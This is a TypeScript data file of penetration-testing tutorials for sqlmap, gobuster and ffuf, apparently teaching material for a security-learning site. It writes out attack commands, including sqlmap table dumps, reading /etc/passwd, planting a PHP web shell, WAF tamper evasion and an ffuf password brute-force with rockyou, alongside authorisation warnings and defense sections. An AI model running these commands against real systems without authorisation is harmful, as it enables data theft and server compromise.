import type { MasterGuide } from "../types";

export const MASTER_GUIDES_2: MasterGuide[] = [
  {
    slug: "sqlmap",
    tagline: "automated SQL injection",
    intro: `**sqlmap** is the definitive automated SQL injection tool. Point it at a URL with a parameter (\`?id=1\`) and it will detect *if* that parameter is injectable, discover the DBMS, enumerate tables, and dump data — all the way to \`--os-shell\` when the conditions allow.

### Why it matters
SQLi is still the most-cited vulnerability in breach reports. sqlmap turns "I think this is injectable" into "here are the tables, here are three rows, here is the auth bypass". Knowing sqlmap deeply means knowing SQLi itself — every sqlmap option maps to a manual technique.

### Install

\`\`\`bash
sudo apt install sqlmap
sqlmap --version
\`\`\`

### Sanity check (your own vulnerable app: DVWA / sqli-labs)

\`\`\`bash
sqlmap -u 'http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie='PHPSESSID=...; security=low' --batch
\`\`\`

Authorisation first. Always. Every example below is "your lab, or a scoped target".`,
    sections: [
      {
        title: "Pre-flight — feed sqlmap the right parameter",
        md: `The #1 reason beginner sqlmap runs "do nothing": the URL/parameter is wrong.

- **Inject the parameter that actually feeds SQL.** \`?id=1\` on an item page is textbook. Search boxes, \`?page=2\`, login fields — all candidates.
- **Authenticated pages need your session.** Pass \`--cookie\` (grab it from browser devtools) or \`--headers\`. Without a valid session sqlmap warns and bails.
- **POST bodies** use \`--method POST --data 'user=admin&pass=admin'\`.
- **Forms**: \`--forms\` makes sqlmap fetch the page, parse the \`<form>\`, and test its inputs.

\`\`\`bash
sqlmap -u 'http://target/login' --method POST --data 'user=admin&pass=admin' --batch
sqlmap -u 'http://target/item?id=1' --cookie 'PHPSESSID=abc123' --batch
sqlmap -u 'http://target/search' --forms --crawl 2 --batch
\`\`\`

Recon twice, run once.`,
      },
      {
        title: "Detection — reading the verdict",
        md: `\`\`\`bash
sqlmap -u 'http://target/item.php?id=5' --batch
\`\`\`
sqlmap tests **boolean-based blind**, **error-based**, **time-based blind**, **UNION query**, and **stacked queries**. The verdict prints like:

\`\`\`text
[INFO] the back-end DBMS is MySQL
[INFO] tested parameter 'id' is INJECTABLE
[INFO] MySQL >= 5.0.12 is a common 'MySQL' fingerprint
\`\`\`

Key skills:
- **The DBMS matters** — MySQL vs SQL Server vs Oracle vs Postgres changes *every* further flag (\`--dbs\` syntax, dump helpers, UDF paths).
- **The technique letter matters** — pay attention to \`T\` (time-based), \`B\` (boolean), \`E\` (error), \`U\` (UNION), \`S\` (stacked). A time-based finding means "every query is slow and every row is a round trip" — plan for slow dumps.
- **A true negative is a result too**: "parameter tested — not injectable" goes in the report and sends you to widen the surface (other params, other endpoints).`,
      },
      {
        title: "Enumerating the estate — from DBMS to data",
        md: `After detection, widen methodically. This is sqlmap's signature excellence:

\`\`\`bash
sqlmap -u '...?id=5' --dbs                     # databases on the server
sqlmap -u '...?id=5' -D appdb --tables          # tables in one db
sqlmap -u '...?id=5' -D appdb -T users --columns  # columns of a table
sqlmap -u '...?id=5' -D appdb -T users --dump     # dump the rows (the prize)
sqlmap -u '...?id=5' -D appdb --tables --count  # row counts (cheap sanity)
sqlmap -u '...?id=5' --schema                    # full schema read
\`\`\`

**Discipline:**
- Dump *columns first*. Knowing \`password_hash\` exists changes the next step; blind-dumping whole tables is noisy, slow, and hammers the DB.
- \`--dump-format=csv\` gives report-ready evidence with headers.
- Time-based dumps are **slow** — every value is a payload round trip. Surf the \`--threads\` / \`--delay\` dials; more threads rarely speed up blind dumps and can destabilise the app.`,
      },
      {
        title: "File access & os-shell — the high-water mark",
        md: `Under the right preconditions sqlmap can read files and even run a shell:

\`\`\`bash
sqlmap -u '...?id=5' --file-read=/etc/passwd
sqlmap -u '...?id=5' --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php
sqlmap -u '...?id=5' --os-shell
\`\`\`

Preconditions that decide whether to bother:
- **MySQL**: needs the \`FILE\` privilege (rare on shared hosting), a writable web root for \`--file-write\`/web-shell paths, and for \`--os-shell\` usually stacked queries too.
- **MS SQL**: uses \`xp_cmdshell\` — often disabled by hardened configs.
- **Oracle**: needs \`UTL_FILE\` plus known paths.

**Never os-shell a production box without written authorisation.** It is the single most impactful (and most WAF-visible) action sqlmap can take. In an authorised engagement, read-only \`--file-read\` is usually enough to prove the point.`,
      },
      {
        title: "WAF evasion — tamper scripts done right",
        md: `\`\`\`bash
sqlmap --list-tampers                                  # the full menu
sqlmap -u '...?id=5' --tamper between,randomcase       # common WAF dinner
sqlmap -u '...?id=5' --tamper=space2comment            # classic space MBA
sqlmap -u '...?id=5' --level 3 --risk 2                # deeper payload sets
sqlmap -u '...?id=5' --random-agent                    # UA entropy
sqlmap -u '...?id=5' --threads 1 --delay 1             # the polite variation
\`\`\`

- \`--level\` (1-5) = how many payloads get tried; \`--risk\` (1-3) = "risky" families (heavy sleeps, \`OR\`-based). Higher levels = more coverage, slower, noisier — and often *needed* on blind targets.
- Tamper scripts mangle payload bytes (comments, case, substitution). **Selectivity wins**: \`between,randomcase\` beats stacking six tamper scripts, because a clean, short payload passes more regex filters than a mangled bloated one.
- Learn which WAF class the target actually runs (ModSecurity-CRS, AWS WAF, Cloudflare) once — then choose the minimal tamper set. "I tamped everything" is a beginner tell.`,
      },
      {
        title: "Defense — the four controls that actually stop sqlmap",
        md: `1. **Parameterised queries / prepared statements everywhere** — the only 100% fix. sqlmap (and every SQLi) dies on \`?id = ?\` bound parameters.
2. **WAF / CDN** with SQLi signature rules in front of every route — \`--tamper\` and \`--level 5\` make this a cat-and-mouse game, but rules + rate-limiting raise the cost.
3. **Least-privilege DB users** — \`FILE\` off, the app user cannot \`SELECT ... INTO OUTFILE\`, no \`xp_cmdshell\`. Most "sqlmap got a shell" stories die here.
4. **Monitoring** — DB-error bursts, long blind queries, and WAF "SQLi attempt" alerts are how the blue team finds the attacker mid-flow.

**Attacker honesty**: when you bypass a WAF, that bypass *is* the finding. Report it as "parameter \<id\> blind SQLi, WAF bypassed via \<tamper\>". Defenders read that with respect.`,
      },
      {
        title: "Pitfalls & pro habits",
        md: `- \`--batch\` is non-interactive automation; know when NOT to use it (you often want to answer the "couldn't detect — try harder?" prompt).
- \`--flush-session\` when an app changed or a run misbehaves — stale session data causes phantom results.
- Read the **fingerprint line and technique letter** before choosing enumeration flags — guessing costs dumps.
- Pair sqlmap with the rest of the kill chain: dumped password hashes → hashcat/John; \`--os-shell\` → your post-exploitation phase; \`--proxy http://127.0.0.1:8080\` during development so Burp replays every sqlmap request.
- **Dump quietly**: \`--columns\` before \`--dump\`, CSV format, deliberate delay on prod.

**Mastery sign**: given a blind-ish target you (1) detect the DBMS and technique, (2) enumerate schema as evidence, (3) pick tamper/risk for the WAF, and (4) explain which DB root-cause the finding maps to — without ever dumping a whole table "just because it's there".`,
      },
    ],
  },
  {
    slug: "gobuster",
    tagline: "directory & DNS brute forcing",
    intro: `**gobuster** brute-forces what isn't linked: directories and files (\`dir\`), virtual hosts (\`vhost\`), DNS subdomains (\`dns\`) and S3 buckets (\`s3\`). It is one of the two canonical "hidden web surface" tools (the other being ffuf) and the first tool to run when your web foothold needs endpoints.

### Why it matters
Robots.txt only lists what the site found. \`/admin\`, \`/backup\`, \`/api\`, \`/.git\`, \`/phpmyadmin\` — exactly what gobuster finds that the app never tells you. In CTFs and real engagements alike, "which endpoints actually exist" is answered by one command.

### Install

\`\`\`bash
sudo apt install gobuster
gobuster --version
\`\`\`

### Sanity check

\`\`\`bash
gobuster dir -u http://localhost/ -w /usr/share/dirb/wordlists/common.txt
\`\`\`

Authorised targets only — brute forcing is loud.`,
    sections: [
      {
        title: "The dir mode you'll use 95% of the time",
        md: `\`\`\`bash
gobuster dir -u http://10.10.10.10 -w wordlist.txt
gobuster dir -u http://10.10.10.10 -w wordlist.txt -x php,txt,html   # extensions
gobuster dir -u http://10.10.10.10 -w wordlist.txt -b 404,403        # exclude codes
gobuster dir -u http://10.10.10.10 -w wordlist.txt -t 40             # threads
gobuster dir -u http://10.10.10.10 -w wordlist.txt -q                # quiet
gobuster dir -u http://10.10.10.10 -w wordlist.txt -o results.txt    # SAVE
\`\`\`

**Status-code triage:**
- \`200\` — exists, go look now.
- \`301/302\` — redirect; follow it (\`-r\` follows automatically).
- \`403\` — exists but denied (still a surface: force-browse, dir confusion, \`/../\`).
- \`401\` — auth-gated; goes on the "needs credentials" pile.
- \`404\` — default noise; tune with \`-b 404\` or a better wordlist.`,
      },
      {
        title: "Wordlists ARE the strategy",
        md: `\`\`\`bash
ls /usr/share/seclists/Discovery/Web-Content/
\`\`\`
- \`directory-list-2.3-medium.txt\` — the best general default (~220k lines).
- \`raft-*-files.txt\` / \`raft-*-directories.txt\` — deduped, frequency-ranked, smarter sets.
- \`common.txt\` — tiny, fast first probe.
- \`big.txt\` — the "exhaust it" mode.
- Password lists (rockyou) are NOT url lists — those go to hydra.

**Time budget math**: 200k words × 1 request / 40 threads ≈ minutes. Add \`-x php,txt\` and you roughly triple requests. That's why \`-b 404\`, quiet parsing, and the right list matter more than the brute engine itself.

**Pro flow — map, then follow the map:**

\`\`\`bash
gobuster dir -u http://target -w raft-medium-directories.txt -o dirs.txt
for d in $(cut -d' ' -f1 dirs.txt); do
  gobuster dir -u "http://target$d" -w raft-medium-files.txt -x php,txt,html -q
done
\`\`\``,
      },
      {
        title: "vhost mode — the one beginners skip",
        md: `\`\`\`bash
gobuster vhost -u http://target -w vhosts-wordlist.txt --append-domain
\`\`\`
The same web host often serves *multiple sites* keyed off the \`Host:\` header. vhost fuzzing finds \`dev.\`, \`admin.\`, \`intra.internal\`-style names that a browser never sends. When "dir mode" turns up nothing on a big corporate site, the crown jewels usually live in a vhost.

**Read honestly**: look for results with a *different* response size than the default host — that difference is the real virtual host. Identical sizes for everything = default-host noise.`,
      },
      {
        title: "dns & s3 modes",
        md: `\`\`\`bash
gobuster dns -d example.com -w subdomains.txt -r 8.8.8.8
gobuster s3 -w bucket-names.txt
\`\`\`
- \`dns\` mode brute-forces subdomains via DNS questions; use the *authoritative* nameserver (\`-r\`) for freshness, and check for wildcard DNS first or results are worthless.
- \`s3\` mode hunts anonymous-ACL S3 buckets — a great "does the org leak to the internet" finding; scope-check before using anything inside.`,
      },
      {
        title: "Detection, defense & pro habits",
        md: `**Attacker tell**: a flood of 404s from one source at high RPS. Even threaded politely, gobuster leaves a signature — which is why "smart-first (\`common.txt\`, slower threads) then targeted" beats 40-thread hammering on prod.

**Defender layers:**
1. WAF/nginx rule: "same-IP burst of 404s over threshold per minute" = enumeration, alert on it.
2. Don't put secrets behind *unlinked* paths — attackers with the same wordlist will find \`/backup\` anyway. Remove the path, don't rename robots.txt.
3. Watch \`/server-status\` and \`/admin\` accesses — they're the root of the endpoint map.

**Pro habits**: always \`-o\`; \`-x\` extensions only when they fit the stack; prod targets need \`--timeout\`, \`--retries\`, \`--delay\`; pair gobuster (path map) → ffuf (precise fuzzing) → nikto/sqlmap on what you found.

**Mastery sign**: one \`dir\` run lands \`/admin\`, \`/backup\`, \`/api\`, and you explain the status-code triage for each within 10 seconds.`,
      },
    ],
  },
  {
    slug: "ffuf",
    tagline: "flexible web fuzzing",
    intro: `**ffuf** ("fast fuzzer") is the precision-guided missile of web fuzzing. You place \`FUZZ\` markers into a URL or request, ffuf slams a wordlist through them, and filters results by status/size/words/lines until only true hits remain. gobuster answers "does a path exist"; ffuf answers "what does ANY value do in THIS slot" — paths, parameters, headers, hosts.

### Why it matters
Every value your app accepts is a slot worth fuzzing. ffuf's speed (high concurrency, connection reuse) and its filtering grammar turn "try a few guesses" into "exhaustively test a slot in seconds". Alongside gobuster for the map, ffuf extracts hidden semantics — hidden params, debug flags, vhosts.

### Install

\`\`\`bash
go install github.com/ffuf/ffuf/v2@latest      # or grab the binary
ffuf -V
\`\`\`

### Sanity check

\`\`\`bash
ffuf -u http://target/FUZZ -w dirs.txt
\`\`\`

Authorised scope: fuzzing is the noisiest web phase there is.`,
    sections: [
      {
        title: "The FUZZ marker and reading the grid",
        md: `\`\`\`bash
ffuf -u http://10.10.10.10/FUZZ -w raft-medium-directories.txt
\`\`\`
Output grid:

\`\`\`text
[Status: 200, Size: 11322, Words: 476, Lines: 68, Duration: 12ms]
    * FUZZ: index.php
[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 4ms]
    * FUZZ: admin
\`\`\`

Read **Status + Size together** — a 200 @ 11322 might be the *default homepage served for anything*. That's why filtering (below) is the real skill, and why redirects (301) should be followed with \`-r\`.`,
      },
      {
        title: "Filter the noise — the master move",
        md: `Know what "nothing" looks like, exclude it, succeed faster:

\`\`\`bash
ffuf -u http://t/FUZZ -w dirs.txt -fc 404                 # exclude status
ffuf -u http://t/FUZZ -w dirs.txt -fs 11322               # exclude size
ffuf -u http://t/FUZZ -w dirs.txt -fw 2                   # exclude word count
ffuf -u http://t/FUZZ -w dirs.txt -fr "<title>404"        # regex exclude
ffuf -u http://t/FUZZ -w dirs.txt -mc 200,301,302         # match these only
\`\`\`

**The flow**: run once unfiltered, note the "everything returns Size 11322" default, re-run with \`-fs 11322\`. You're negating the *target's* personality instead of guessing.`,
      },
      {
        title: "Beyond paths — params, headers, logins",
        md: `\`\`\`bash
# fuzz a parameter VALUE
ffuf -u 'http://t/item?id=FUZZ' -w ids.txt
# fuzz which parameter NAMES exist (hidden param hunting)
ffuf -u 'http://t/item?FUZZ=1' -w param-names.txt -fs <default>
# fuzz a Host header (vhost hunting)
ffuf -u http://t/ -H "Host: FUZZ.example.com" -w vhosts.txt -fs <default>
# fuzz a POST login
ffuf -u http://t/login -X POST -d 'user=admin&pass=FUZZ' -w rockyou-top-100k.txt -fc 200
\`\`\`

The move of the master: instead of asking "does /admin exist", you fuzz "which value of \`?page=\` renders a different page — is there an \`admin=true\` param?" Hidden parameter abuse and vhost gaps are exactly what untouched app surfaces are full of.`,
      },
      {
        title: "Evidence — write JSON, replay through Burp",
        md: `\`\`\`bash
ffuf -u http://t/FUZZ -w dirs.txt -mc 200 -o hits.json
cat hits.json | jq -r '.results[] | "\(.status) \(.url)"'
ffuf -u http://t/FUZZ -w dirs.txt -replay-proxy http://127.0.0.1:8080
\`\`\`

Always \`-o hits.json\` — fuzzing output is a list of *positive responses*, and that list (with sizes) is the evidence your report quotes. \`-replay-proxy\` sends every hit through Burp, turning throwaway fuzz results into fully repeatable, inspectable requests.`,
      },
      {
        title: "Rate, threads, politeness",
        md: `\`\`\`bash
ffuf -u http://t/FUZZ -w list.txt -t 100                  # lab speed
ffuf -u http://t/FUZZ -w list.txt -t 20 -rate 40          # prod politeness
ffuf -u http://t/FUZZ -w list.txt -p 0.2                  # pause between batches
\`\`\`

- Lab/CTF: \`-t 100\` is sport. **Production**: keep threads low and \`-rate\` capped — a 200k hammer against prod nginx is how you learn a client's pager number.
- \`-p\` (delay), \`-timeout\`, \`-retries\`, and \`-ignore-body\` give fine control.
- Honest engineering: ffuf at high rate against a poorly scoped cloud target means you *are* part of the DoS. Rate to the target's patience, not your wordlist's length.`,
      },
      {
        title: "Pitfalls & pro habits",
        md: `- **Size filters solve "everything is 200"** — the single most common gotcha.
- Match/filter on size AND status; rarely rely on one.
- **Don't fuzz \`-t 100\` on prod** — politeness is a tool, used deliberately.
- When a slot fuzzes "16 hits", curl the interesting ones manually — fuzz finds the map, humans pick the treasure (admin panels, SSRF sinks, LFI candidates).
- Pair ffuf (slot precision) → gobuster (path map) → sqlmap/Burp replay when a hit looks injectable.

**Mastery sign**: given an app with a hidden \`debug=true\` param, you find it, confirm it changes behaviour, and report "parameter fuzzing discovered a debug flag" with JSON evidence — in one session.`,
      },
    ],
  },
];